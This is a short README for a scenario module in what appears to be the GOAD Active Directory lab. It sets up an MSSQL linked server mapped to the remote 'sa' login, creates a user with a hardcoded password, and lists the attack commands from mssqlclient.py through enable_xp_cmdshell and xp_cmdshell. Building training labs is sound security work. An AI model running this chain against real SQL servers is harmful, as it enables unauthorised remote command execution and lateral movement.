# mssql-linked

On GOAD-Base srv02 (north), creates domain user `scn-sql-link` (password `Aa1234567890!`) with a login, and a linked server named after the other SQL host (`BRAAVOS`, essos forest) where that login is mapped to the remote `sa`. RPC and RPC out are enabled.

Attack:

    mssqlclient.py -windows-auth <domain>/scn-sql-link:'Aa1234567890!'@<host ip>
    SQL> enum_links
    SQL> use_link BRAAVOS
    SQL >"BRAAVOS"> enable_xp_cmdshell
    SQL >"BRAAVOS"> xp_cmdshell whoami

How to verify:

    EXEC sp_linkedservers; SELECT * FROM sys.linked_logins

Disable drops the linked server with its login mappings, drops the local login and resets `xp_cmdshell` and `show advanced options` to `0` (Base values) on the target, and deletes the domain user. Not cleaned: `xp_cmdshell` enabled on the remote server through the link (disable it there by hand).
